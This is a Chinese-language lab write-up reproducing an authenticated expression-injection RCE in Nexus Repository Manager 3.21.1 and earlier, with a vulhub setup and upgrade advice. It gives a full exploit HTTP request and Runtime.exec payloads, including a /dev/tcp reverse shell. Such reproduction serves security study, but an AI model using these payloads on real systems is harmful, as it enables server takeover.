## **0x0** **0** **简介**

nexus的全称是Nexus Repository
Manager，是Sonatype公司的一个产品。它是一个强大的仓库管理器，极大地简化了内部仓库的维护和外部仓库的访问。

主要用它来搭建公司内部的maven私服。但是它的功能不仅仅是创建maven私有仓库这么简单，还可以作为nuget、docker、npm、bower、pypi、rubygems、git
lfs、yum、go、apt等的私有仓库，功能非常强大。

##  **0x01漏洞概述**

在 Nexus Repository Manager OSS/Pro 3.21.1
及之前的版本中，由于某处功能安全处理不当，导致经过授权认证的攻击者，可以在远程通过构造恶意的 HTTP 请求，在服务端执行任意恶意代码，获取系统权限。
**此漏洞的利用需要攻击者具备任意类型的账号权限** 。

##  **0x02影响版本**

Nexus Repository Manager OSS/Pro 3.x <= 3.21.1

##  **0x03环境搭建**

1、本次漏洞环境使用vulhub搭建，在有docker环境的虚拟机中下载

git clone https://github.com/vulhub/vulhub.git

2、进入漏洞目录，执行docker-compose up -d 命令拉取漏洞环境

![1614663390_603dcedeca512d845fe7d.png!small](https://image.3001.net/images/20210302/1614663390_603dcedeca512d845fe7d.png!small)

3、看到绿色的done表示拉取成功，在浏览器访问http://your-ip:8081查看页面

![1614663399_603dcee7270bf1743b7b8.png!small](https://image.3001.net/images/20210302/1614663399_603dcee7270bf1743b7b8.png!small)

##  **0x04漏洞复现**

1、首先使用账号密码admin/admin登录后台

![1614663403_603dceeb95417903d7dc3.png!small](https://image.3001.net/images/20210302/1614663403_603dceeb95417903d7dc3.png!small)

2、登录后使用f12找到cookie复制当前的csrf-Token

![1614663407_603dceef9e00913d68a6b.png!small](https://image.3001.net/images/20210302/1614663407_603dceef9e00913d68a6b.png!small)

3、使用burp进行抓包，替换以下数据包，然后把自己的cookie和csrf-Token粘贴上去，然后发包即可看到执行了9*9

    
    
    POST /service/rest/beta/repositories/go/group HTTP/1.1
    
    Host: 172.16.1.147:8081
    
    Content-Length: 203
    
    X-Requested-With: XMLHttpRequest
    
    X-Nexus-UI: true
    
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
    
    NX-ANTI-CSRF-TOKEN: 0.16290768329434402
    
    Content-Type: application/json
    
    Accept: */*
    
    Origin: http://172.16.1.147:8081
    
    Referer: http://172.16.1.147:8081/
    
    Accept-Encoding: gzip, deflate
    
    Accept-Language: zh-CN,zh;q=0.9
    
    Cookie: NX-ANTI-CSRF-TOKEN=0.16290768329434402; NXSESSIONID=69d8dc11-45ac-44b6-aa68-65ca1d6b68ff
    
    Connection: close
    
    
    
    
    {
    
    "name": "internal",
    
    "online": true,
    
    "storage": {
    
    "blobStoreName": "default",
    
    "strictContentTypeValidation": true
    
    },
    
    "group": {
    
    "memberNames": ["$\\A{9*9}"]
    
    }
    
    }

![1614663412_603dcef4787c3367fdf0d.png!small](https://image.3001.net/images/20210302/1614663412_603dcef4787c3367fdf0d.png!small)

4、把执行9*9修改为创建一个文件，进入docker中查看创建成功

$\\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('touch
/tmp/success')}

![1614663415_603dcef75969a86154693.png!small](https://image.3001.net/images/20210302/1614663415_603dcef75969a86154693.png!small)

![1614663420_603dcefc5f9a8cb695712.png!small](https://image.3001.net/images/20210302/1614663420_603dcefc5f9a8cb695712.png!small)

5、执行反弹shell把执行写入文件的payload修改成反弹shell的命令，使用nc进行监听，点击发送查看nc的监听看到返回了shell

    
    
    "$\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('/bin/bash -c bash$IFS$9-i>&/dev/tcp/ip/port<&1')}"

![1614663425_603dcf017f4b08a842472.png!small](https://image.3001.net/images/20210302/1614663425_603dcf017f4b08a842472.png!small)

![1614663430_603dcf066fbc38d5afeb2.png!small](https://image.3001.net/images/20210302/1614663430_603dcf066fbc38d5afeb2.png!small)

##  **0x0** **5** **修复建议**

1、官方已发布新版本修复了该漏洞，建议升级至最新版本

参考链接：https://mp.weixin.qq.com/s/CAtsX3yP81mULbMDTo0J1A

